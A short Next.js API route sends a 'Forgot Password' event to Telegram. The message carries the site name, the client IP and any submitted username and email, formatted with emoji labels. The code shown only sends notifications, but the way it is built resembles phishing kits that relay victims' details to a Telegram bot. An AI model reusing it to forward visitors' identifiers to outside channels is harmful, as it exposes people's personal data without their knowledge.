import { NextResponse } from 'next/server';
import { sendTelegramMessage, getSiteName } from '@/lib/telegram';

function getClientIp(request) {
  const forwarded = request.headers.get('x-forwarded-for');
  const realIp = request.headers.get('x-real-ip');
  if (forwarded) return forwarded.split(',')[0].trim();
  if (realIp) return realIp.trim();
  return null;
}

function escapeHtml(s) {
  if (typeof s !== 'string') return '';
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function sanitize(value) {
  if (value == null || typeof value !== 'string') return '';
  return value.replace(/\s+/g, ' ').trim().slice(0, 500);
}

export async function POST(request) {
  try {
    const ip = getClientIp(request) || 'Unknown';
    let username = '';
    let email = '';
    try {
      const body = await request.json();
      username = sanitize(body?.username ?? '');
      email = sanitize(body?.email ?? '');
    } catch {
      // No body or invalid JSON (e.g. link click)
    }
    const lines = [
      `🏷 Site: ${escapeHtml(getSiteName())}`,
      '',
      '🔹 Type: Forgot Password',
      `🌍 IP: ${escapeHtml(ip)}`,
    ];
    if (username) lines.push(`👤 Username: ${escapeHtml(username)}`);
    if (email) lines.push(`📧 Email: ${escapeHtml(email)}`);
    const message = lines.join('\n');

    await sendTelegramMessage(message);
    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error('notify-forgot-password:', err);
    return NextResponse.json({ error: 'Notification failed' }, { status: 503 });
  }
}
